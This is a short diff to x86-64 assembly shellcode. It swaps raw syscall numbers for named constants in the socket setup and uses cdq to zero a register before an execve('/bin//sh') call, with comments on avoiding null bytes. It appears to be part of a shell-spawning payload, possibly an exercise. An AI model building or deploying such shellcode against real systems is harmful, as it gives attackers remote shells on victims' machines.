@@ -24,11 +24,11 @@ _init_socket:
     ; syscall number 41
 
     ; To prevent nullbytes I used the push pop technique and cdq to zero out rdx
-    push 41
+    push SYS_SOCKET
     pop rax
-    push 2
+    push AF_INET
     pop rdi
-    push 1
+    push SOCK_STREAM
     pop rsi
     cdq
 
@@ -117,8 +117,7 @@ _loop:
 _execve:
     ; execve('/bin//sh', NULL, NULL)
 
-    push rax
-    pop rdx      
+    cdq
 
     push rax    
     mov rax, BINSH
